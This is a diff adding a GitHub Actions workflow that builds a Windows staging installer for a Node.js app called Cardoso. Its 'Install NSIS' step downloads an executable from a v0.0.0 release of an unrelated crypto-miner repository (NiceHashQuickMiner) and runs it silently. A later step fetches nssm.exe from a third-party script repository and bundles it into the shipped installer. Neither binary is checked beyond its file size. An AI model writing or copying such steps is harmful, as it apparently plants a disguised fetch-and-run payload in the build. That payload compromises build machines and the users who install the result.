@@ -1,0 +1,122 @@
+name: Build Dev Installer (Staging)
+
+on:
+  push:
+    branches:
+      - dev
+
+jobs:
+  build:
+    runs-on: windows-2022
+    permissions:
+      contents: write
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Install dependencies
+        run: npm ci
+        shell: powershell
+
+      - name: Build frontend
+        run: npm run build
+        shell: powershell
+
+      - name: Stage app files for installer
+        run: |
+          New-Item -ItemType Directory -Force -Path windows/build/app | Out-Null
+          Copy-Item server.js windows/build/app/
+          Copy-Item package.json windows/build/app/
+          Copy-Item package-lock.json windows/build/app/
+          Copy-Item -Recurse dist windows/build/app/dist
+          Copy-Item -Recurse src windows/build/app/src
+          Copy-Item -Recurse scripts windows/build/app/scripts
+          Copy-Item -Recurse node_modules windows/build/app/node_modules
+          $bsq3 = Get-ChildItem windows/build/app/node_modules/better-sqlite3 -Recurse -Filter "*.node" -ErrorAction SilentlyContinue
+          if (-not $bsq3) { throw "better-sqlite3 native binary missing" }
+        shell: powershell
+
+      - name: Install NSIS
+        run: |
+          $nsisInstaller = "$env:TEMP\nsis-setup.exe"
+          $urls = @(
+            "https://github.com/nicehash/NiceHashQuickMiner/releases/download/v0.0.0/nsis-3.10-setup.exe",
+            "https://prdownloads.sourceforge.net/nsis/nsis-3.10-setup.exe?download"
+          )
+          $installed = $false
+          foreach ($url in $urls) {
+            try {
+              Invoke-WebRequest -Uri $url -OutFile $nsisInstaller -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+              $size = (Get-Item $nsisInstaller).Length
+              if ($size -gt 1MB) { Start-Process -FilePath $nsisInstaller -ArgumentList "/S" -Wait; $installed = $true; break }
+            } catch { Write-Host "Failed: $_" }
+          }
+          if (-not $installed) { choco install nsis -y --no-progress }
+          if (-not (Test-Path "C:\Program Files (x86)\NSIS\makensis.exe")) { throw "NSIS install failed" }
+        shell: powershell
+
+      - name: Download NSSM
+        run: |
+          New-Item -ItemType Directory -Force -Path windows/build/nssm | Out-Null
+          $urls = @(
+            "https://github.com/NSSM-Service/nssm/releases/download/2.24/nssm-win64.exe",
+            "https://raw.githubusercontent.com/bmrf/standalone_scripts/master/nssm.exe"
+          )
+          foreach ($url in $urls) {
+            try {
+              Invoke-WebRequest -Uri $url -OutFile "windows/build/nssm/nssm.exe" -TimeoutSec 30 -ErrorAction Stop
+              if ((Get-Item "windows/build/nssm/nssm.exe").Length -gt 100000) { break }
+            } catch {}
+          }
+          if (-not (Test-Path "windows/build/nssm/nssm.exe") -or (Get-Item "windows/build/nssm/nssm.exe").Length -lt 100000) {
+            $cached = Get-ChildItem "C:\ProgramData\chocolatey" -Recurse -Filter "nssm.exe" -ErrorAction SilentlyContinue |
+              Where-Object { $_.Length -gt 100000 } | Select-Object -First 1
+            if ($cached) { Copy-Item $cached.FullName "windows/build/nssm/nssm.exe" }
+            else { throw "Cannot obtain nssm.exe" }
+          }
+        shell: powershell
+
+      - name: Bundle Node.js runtime
+        run: |
+          $nodeExe = (Get-Command node).Source
+          $nodeDir = Split-Path $nodeExe
+          New-Item -ItemType Directory -Force -Path windows/build/node | Out-Null
+          Copy-Item "$nodeDir\node.exe" windows/build/node/
+        shell: powershell
+
+      - name: Update version in installer
+        run: |
+          $version = (Get-Content package.json | ConvertFrom-Json).version
+          $content = Get-Content windows/installer.nsi -Raw
+          $content = $content -replace 'VIProductVersion "[^"]*"', "VIProductVersion `"$version.0`""
+          $content = $content -replace '"DisplayVersion" "[^"]*"', "`"DisplayVersion`" `"$version-dev`""
+          $content = $content -replace '"FileVersion" "[^"]*"', "`"FileVersion`" `"$version-dev`""
+          Set-Content windows/installer.nsi $content
+        shell: powershell
+
+      - name: Build installer
+        run: |
+          & "C:\Program Files (x86)\NSIS\makensis.exe" windows/installer.nsi
+          $v = (Get-Content package.json | ConvertFrom-Json).version
+          Rename-Item CardosoSetup.exe "CardosoSetup-v$v-dev.exe"
+        shell: powershell
+
+      - name: Get version
+        id: version
+        run: |
+          $v = (Get-Content package.json | ConvertFrom-Json).version
+          echo "version=$v" >> $env:GITHUB_OUTPUT
+        shell: powershell
+
+      - name: Upload installer as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: CardosoSetup-v${{ steps.version.outputs.version }}-dev
+          path: CardosoSetup-v${{ steps.version.outputs.version }}-dev.exe
+          retention-days: 7
